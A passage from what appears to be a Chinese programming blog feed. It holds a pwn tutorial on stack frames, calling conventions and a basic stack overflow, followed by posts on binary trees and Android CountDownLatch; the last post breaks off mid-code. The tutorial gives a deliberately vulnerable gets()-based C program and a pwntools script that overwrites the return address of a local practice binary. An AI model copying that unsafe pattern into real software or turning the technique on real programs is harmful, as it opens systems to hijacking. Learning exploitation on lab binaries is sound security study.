        <content type="html"><![CDATA[<h1 id="实现栈溢出的两个条件"><a href="#实现栈溢出的两个条件" class="headerlink" title="实现栈溢出的两个条件:"></a>实现栈溢出的两个条件:</h1><ul><li>程序有向栈写入数据的行为</li><li>程序并不限制写入数据的长度</li></ul><h1 id="ESP和EBP两个寄存器"><a href="#ESP和EBP两个寄存器" class="headerlink" title="ESP和EBP两个寄存器"></a>ESP和EBP两个寄存器</h1><p>如果想用栈溢出来执行攻击指令, 就要在溢出数据内包含攻击指令的<strong>内容或地址</strong>, 并且要将程序控制权交给该指令。攻击指令可以是自定义的指令, 也可以利用系统内已有的函数及指令。</p><p>函数调用经常是<strong>嵌套</strong>的, 在同一时刻, 堆栈中会有多个函数的信息. 每个未完成运行的函数占用一个<strong>独立的连续区域</strong>, 称作**栈帧(Stack Frame)**。 当函数被调用时, 栈帧被压入堆栈; 当函数返回时, 栈帧从堆栈中弹出. 栈帧存放函数的参数、函数返回地址、调用者(caller)的一些寄存器状态、函数的局部变量等。</p><p>栈帧的边界由<strong>栈帧基地址指针EBP</strong>和<strong>栈帧堆栈指针ESP</strong>界定(指正存放在相应寄存器中)。 EBP指向<strong>栈帧底部(高地址)</strong>, 在当前栈帧内位置固定; ESP指向<strong>栈帧顶部(低地址)</strong>, 当程序执行时ESP会随着数据的入栈和出栈而移动(如: 压入局部变量)。因此函数中对<strong>数据的访问</strong>大部分是基于EBP(通过记录对EBP的偏移量)。</p><p><strong>ESP(Stack Pointer)是堆栈指针寄存器</strong>，存放执行函数对应栈帧的栈顶地址(也是系统栈的顶部)，且始终指向栈顶；</p><p><strong>EBP(Base Pointer)是栈帧基址指针</strong>寄存器，存放执行函数对应栈帧的栈底地址，用于C运行库访问栈中的局部变量和参数。</p><h1 id="函数调用时入栈顺序"><a href="#函数调用时入栈顺序" class="headerlink" title="函数调用时入栈顺序"></a>函数调用时入栈顺序</h1><p><strong>1.先压入的是实参以及返回地址，再将EBP寄存器中的值压入，最后压入被调函数中的变量</strong></p><p>实参-&gt;主调函数返回地址-&gt;主调函数栈帧EBP-&gt;被调函数局部变量</p><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018103710718.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018103710718.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018103710718"></p><p>2.主调函数将参数按照调用约定依次入栈(上图为从右到左依次入栈)，然后<code>Return Address</code>指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)，压入返回地址时通过call是实现。</p><p>3.进入被调函数时，被调函数将主调函数的<strong>帧基指针EBP</strong>入栈，并将主调函数的<strong>栈顶指针ESP</strong>值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。<strong>此时被调函数帧基指针指向被调函数的栈底。</strong></p><p>4.被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。</p><p>5.调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p><p><strong>“leave;ret指令”该指令等价于“mov sp,bp; pop bp;ret”等指令执行完毕，站定指针被设置为bp所指向的值，改变bp的值，能起到到很多作用，如执行rop，扩展栈空间。</strong></p><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201101122001473.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201101122001473.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201101122001473"></p><p>6.例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Strt</span>&#123;</span></span><br><span class="line">     <span class="keyword">int</span> member1;</span><br><span class="line">     <span class="keyword">int</span> member2;</span><br><span class="line">     <span class="keyword">int</span> member3;</span><br><span class="line"> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">StackFrameContent</span><span class="params">(<span class="keyword">int</span> para1, <span class="keyword">int</span> para2, <span class="keyword">int</span> para3)</span></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> locVar1 = <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">int</span> locVar2 = <span class="number">2</span>;</span><br><span class="line">     <span class="keyword">int</span> locVar3 = <span class="number">3</span>;</span><br><span class="line">     <span class="keyword">int</span> arr[] = &#123;<span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>&#125;;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Strt</span> <span class="title">tStrt</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018133859545.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018133859545.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018133859545"></p><p>内存地址从栈底到栈顶递减，压栈就是把ESP指针逐渐往地低址移动的过程。而结构体tStrt中的成员变量memberX地址=tStrt首地址+(memberX偏移量)，即越靠近tStrt首地址的成员变量其内存地址越小。因此，<strong>结构体成员变量的入栈顺序与其在结构体中声明的顺序相反。</strong></p><h2 id="函数参数值传递与指针传递区别："><a href="#函数参数值传递与指针传递区别：" class="headerlink" title="函数参数值传递与指针传递区别："></a>函数参数值传递与指针传递区别：</h2><p>函数调用以值传递，传入实参与被函数内操作的形参两者的存储地址不同，因此被调函数无法直接修改主调函数实参值，为达到修改目的，需要向被调函数传递实参变量的指针（即变量的地址）。</p><h1 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h1><h2 id="函数参数的传递顺序和方式"><a href="#函数参数的传递顺序和方式" class="headerlink" title="函数参数的传递顺序和方式"></a>函数参数的传递顺序和方式</h2><p>最常见的参数传递方式是通过堆栈传递。主调函数将参数压入栈中，被调函数以相对于帧基指针的正偏移量来访问栈中的参数。对于有多个参数的函数，调用约定需规定主调函数将参数压栈的顺序(从左至右还是从右至左)。某些调用约定允许使用寄存器传参以提高性能。</p><h2 id="栈的维护方式"><a href="#栈的维护方式" class="headerlink" title="栈的维护方式"></a>栈的维护方式</h2><p>主调函数将参数压栈后调用被调函数体，返回时需将被压栈的参数全部弹出，以便将栈恢复到调用前的状态。该清栈过程可由主调函数负责完成，也可由被调函数负责完成。</p><h2 id="名字修饰策略"><a href="#名字修饰策略" class="headerlink" title="名字修饰策略"></a>名字修饰策略</h2><h3 id="又称函数名修饰-Decorated-Name-规则。编译器在链接时为区分不同函数，对函数名作不同修饰。"><a href="#又称函数名修饰-Decorated-Name-规则。编译器在链接时为区分不同函数，对函数名作不同修饰。" class="headerlink" title="又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。"></a>又称函数名修饰(Decorated Name)规则。编译器在链接时为区分不同函数，对函数名作不同修饰。</h3><p>   若函数之间的调用约定不匹配，可能会产生堆栈异常或链接错误等问题。因此，为了保证程序能正确执行，所有的函数调用均应遵守一致的调用约定。</p><h3 id="cdecl调用约定-函数参数从右往左的顺序入栈-函数调用者负责清除栈中的参数-返回值在EAX中"><a href="#cdecl调用约定-函数参数从右往左的顺序入栈-函数调用者负责清除栈中的参数-返回值在EAX中" class="headerlink" title="cdecl调用约定(函数参数从右往左的顺序入栈,函数调用者负责清除栈中的参数,返回值在EAX中)"></a>cdecl调用约定(函数参数从右往左的顺序入栈,函数调用者负责清除栈中的参数,返回值在EAX中)</h3><p>所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p><table><thead><tr><th><strong>调用方式</strong></th><th><strong>stdcall(Win32)</strong></th><th><strong>cdecl</strong></th><th><strong>fastcall</strong></th><th><strong>thiscall(C++)</strong></th><th><strong>naked call</strong></th></tr></thead><tbody><tr><td><strong>参数压栈顺序</strong></td><td>从右至左</td><td>从右至左</td><td>从右至左，Arg1在ecx，Arg2在edx</td><td>从右至左，this指针在ecx</td><td>自定义</td></tr><tr><td><strong>参数位置</strong></td><td>栈</td><td>栈</td><td>栈 + 寄存器</td><td>栈，寄存器ecx</td><td>自定义</td></tr><tr><td><strong>负责清栈的函数</strong></td><td>被调函数</td><td><strong>主调函数</strong></td><td>被调函数</td><td>被调函数</td><td>自定义</td></tr><tr><td><strong>支持可变参数</strong></td><td>否</td><td><strong>是</strong></td><td>否</td><td>否</td><td>自定义</td></tr><tr><td><strong>函数名字格式</strong></td><td>_name@number</td><td>_name</td><td>@name@number</td><td></td><td>自定义</td></tr><tr><td><strong>参数表开始标识</strong></td><td>“@@YG”</td><td>“@@YA”</td><td>“@@YI”</td><td></td><td>自定义</td></tr><tr><td>注：C++因支撑函数重载、命名空间和成员函数等语法特征，采用更为复杂的名字修饰策略。C++函数修饰名以”?”开始，后面紧跟函数名、参数表开始标识和按照类型代号拼出的返回值参数表。例如，函数int Function(char *var1,unsigned long)对应的stdcall修饰名为”?Function@@YGHPADK@Z”。</td><td>Windows API默认的函数调用协议</td><td>C/C++默认的函数调用协议</td><td>适用于对性能要求较高的场合</td><td></td><td></td></tr></tbody></table><p><strong>x86程序</strong>：</p><p>普通函数传参数：参数基本都压在栈上；</p><p>syscall传参：eax对应系统调用号，ebx，ecx、edx、esi、edi、ebp分别对应前六个参数。多余的参数压在栈上。</p><p><strong>x64程序：</strong></p><p>普通函数传参数：先使用rdi、rsi、rdx、rcx、r8、r9寄存器作为函数参数的前六个参数，多余参数会一次压在栈上。</p><p>syscall传参：rax对应系统调用号，传参规则和普通函数传参一致。</p><p><strong>arm程序</strong>：</p><p>RO、R1、R2、R3，依次对应前四个参数，多余的参数会一次压在栈上。</p><p>—stacall和—fastcall这两种调用方式的传参规则如上表</p><h1 id="基本的栈溢出操作"><a href="#基本的栈溢出操作" class="headerlink" title="基本的栈溢出操作"></a>基本的栈溢出操作</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//first.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">success</span><span class="params">()</span> </span>&#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译代码：不开启堆栈溢出保护，关闭 PIE（Position Independent Executable），避免加载基址被打乱</p><p> <code>gcc -m32 -fno-stack-protector -no-pie first.c -o first</code></p><p>用<code>checksec</code>查看</p><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155424330.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155424330.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018155424330">没有开栈溢出保护以及随机地址</p><p><strong>NX是栈不可执行保护已经打开</strong></p><p>在IDA中看到<img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018153515033.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018153515033.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018153515033"></p><p>该char字符距离栈底EBP有0x14也就是20个字节，根据函数栈的一个基本模型可以画出这个结构</p><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154545316.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154545316.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018154545316"></p><p>目的应该就是要覆盖调用函数的返回地址，这样的话要覆盖0X14+0X4个字节一共是24个字节，然后再加上一个返回地址</p><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154745319.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018154745319.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018154745319"></p><p>由IDA可以看到success的首地址为0X08048456</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">## 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./first&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x08048456</span></span><br><span class="line"><span class="comment">## 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span> + p32(success_addr)</span><br><span class="line"><span class="comment">#print p32(success_addr)</span></span><br><span class="line"><span class="comment">## 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">## 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155219541.png" class="lazyload" data-srcset="/2020/10/18/Pwn/Pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/image-20201018155219541.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201018155219541"></p><p>最后运行到了success函数</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-二叉树</title>
      <link href="/2020/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
      <url>/2020/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<h1 id="1-树的定义"><a href="#1-树的定义" class="headerlink" title="1.树的定义"></a>1.树的定义</h1><h3 id="1-树的节点："><a href="#1-树的节点：" class="headerlink" title="1.树的节点："></a>1.树的节点：</h3><p>使用树结构存储的每一个数据元素被称为”节点“。<img src="/2020/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/image-20201017115850118.png" class="lazyload" data-srcset="/2020/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91/image-20201017115850118.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201017115850118"></p><p>图中每一个圆圈代表一个节点</p><p><strong>如果一个节点没有父节点，那么这个节点就是整棵树的根节点</strong></p><h3 id="2-节点的度和层次"><a href="#2-节点的度和层次" class="headerlink" title="2.节点的度和层次"></a>2.节点的度和层次</h3><p>对于一个节点，拥有的子树数（节点有多少分支）称为节点的度。</p><p>结点的层次：从一棵树的树根开始，树根所在层为第一层，根的孩子结点所在的层为第二层，依次类推。对于图 1（A）来说，A 结点在第一层，B、C、D 为第二层，E、F、G、H、I、J 在第三层，K、L、M 在第四层。</p><p><strong>一个树的深度或高度是树种节点所在的最大的层次，上图树的深度为4。</strong></p><h3 id="3-有序树和无序树："><a href="#3-有序树和无序树：" class="headerlink" title="3.有序树和无序树："></a>3.有序树和无序树：</h3><p>如果树中节点的子树从左到右看，左右顺序有规定，则称为有序树，反之为无序树</p><h3 id="4-森林"><a href="#4-森林" class="headerlink" title="4.森林"></a>4.森林</h3><p>由m(m&gt;=0)个互不相交的树的集合称为森林，上图，分别以B、C、D为根节点的三棵子树就可以称为森林，前面讲到，树可以理解为是由根结点和若干子树构成的，而这若干子树本身是一个森林，所以，树还可以理解为是由根结点和森林组成的。用一个式子表示为：</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-并发多线程操作</title>
      <link href="/2020/10/13/Android/Android-%E5%B9%B6%E5%8F%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/10/13/Android/Android-%E5%B9%B6%E5%8F%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="CountDownLatch实现并发多线程操作"><a href="#CountDownLatch实现并发多线程操作" class="headerlink" title="CountDownLatch实现并发多线程操作"></a>CountDownLatch实现并发多线程操作</h1><h4 id="1-Java中的concurrent包里面的CountDownLatch其实可以把它看作一个计数器，只不过这个计数器的操作是原子操作，同时只能有一个线程去操作这个计数器，也就是同时只能有一个线程去减这个计数器里面的值。"><a href="#1-Java中的concurrent包里面的CountDownLatch其实可以把它看作一个计数器，只不过这个计数器的操作是原子操作，同时只能有一个线程去操作这个计数器，也就是同时只能有一个线程去减这个计数器里面的值。" class="headerlink" title="1.Java中的concurrent包里面的CountDownLatch其实可以把它看作一个计数器，只不过这个计数器的操作是原子操作，同时只能有一个线程去操作这个计数器，也就是同时只能有一个线程去减这个计数器里面的值。"></a><strong>1.Java中的concurrent包里面的CountDownLatch其实可以把它看作一个计数器，只不过这个计数器的操作是原子操作，同时只能有一个线程去操作这个计数器，也就是同时只能有一个线程去减这个计数器里面的值。</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        testCountDownLatch();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在主线程创建一个子线程，在子线程中创建一个线程池，通过在线程中使用CountDownLatch.await(),等线程池中的子线程全部执行完毕，再回到该线程</span></span><br><span class="line">    <span class="comment">//执行UI操作</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">testCountDownLatch</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> Handler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (msg.what == <span class="number">1</span>)&#123;</span><br><span class="line">                    TextView textView=findViewById(R.id.test);</span><br><span class="line">                    textView.setText(<span class="string">&quot;设置完成&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                CountDownLatch latch = <span class="keyword">new</span> CountDownLatch(<span class="number">2</span>);<span class="comment">// 设置计数值,</span></span><br><span class="line">                ExecutorService exec = Executors.newCachedThreadPool();<span class="comment">// 创建线程池</span></span><br><span class="line">                exec.execute(<span class="keyword">new</span> TestRunable1(latch));</span><br><span class="line">                exec.execute(<span class="keyword">new</span> TestRunable2(latch));</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    latch.await();<span class="comment">// 等待所有线程完成操作</span></span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                handler.sendEmptyMessage(<span class="number">1</span>);</span><br><span class="line">                exec.shutdown();</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestRunable1</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> CountDownLatch latch;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TestRunable1</span><span class="params">(CountDownLatch latch)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">            <span class="keyword">this</span>.latch = latch;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span> * <span class="number">5</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            latch.countDown();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestRunable2</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> CountDownLatch latch;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TestRunable2</span><span class="params">(CountDownLatch latch)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">            <span class="keyword">this</span>.latch = latch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> 